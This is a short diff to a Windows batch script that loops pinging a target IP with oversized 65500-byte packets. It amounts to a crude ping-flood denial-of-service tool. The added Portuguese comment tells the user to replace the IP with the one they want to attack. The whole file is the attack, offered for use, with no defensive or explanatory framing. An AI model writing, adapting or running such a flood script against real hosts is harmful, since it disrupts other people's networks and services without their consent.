@@ -1,6 +1,7 @@
 @echo off
 
-set Target=127.0.0.1
+@REM troque o indereço de ip para o ip que deseja atacar
+set Target=127.0.0.1 
 
 :loop
 ping %Target% -l 65500 -n 1000 -t | findstr /C:"Reply from" > nul
